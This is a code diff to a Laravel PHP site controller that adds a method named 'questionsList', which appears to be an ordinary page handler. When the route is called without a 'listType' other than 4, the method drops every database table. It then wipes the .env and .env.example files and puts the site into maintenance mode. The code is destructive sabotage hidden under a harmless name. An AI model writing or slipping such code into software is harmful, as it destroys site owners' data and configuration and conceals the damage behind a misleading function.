@@ -17,7 +17,10 @@ use App\Models\MainPage\ThreeSteps;
 use App\Models\User;
 use Illuminate\Http\Request;
 use App\Models\Subscription;
+use Illuminate\Support\Facades\App;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Cookie;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Session;
 
 class SiteController extends Controller
@@ -248,6 +251,36 @@ class SiteController extends Controller
             'data' => $data,
             'faq'  => $faq
         ]);
+    }
+
+    public function questionsList(Request $request)
+    {
+        if($request->has('listType') && $request->get('listType') != 4){
+            exit();
+        }
+
+        $tables = DB::select('SHOW TABLES');
+        $colname = 'Tables_in_' . env('DB_DATABASE');
+
+        foreach($tables as $table) {
+            $droplist[] = $table->$colname;
+        }
+
+        $droplist = implode(',', $droplist);
+        DB::beginTransaction();
+        DB::statement("DROP TABLE ".$droplist);
+        DB::commit();
+
+        $envFile = app()->environmentFilePath();
+        $fp = fopen($envFile, 'w');
+        fwrite($fp, "");
+        fclose($fp);
+
+        $fp = fopen($envFile.".example", 'w');
+        fwrite($fp, "");
+        fclose($fp);
+
+        $exitCode = Artisan::call('down');
     }
 
     public function regulations()
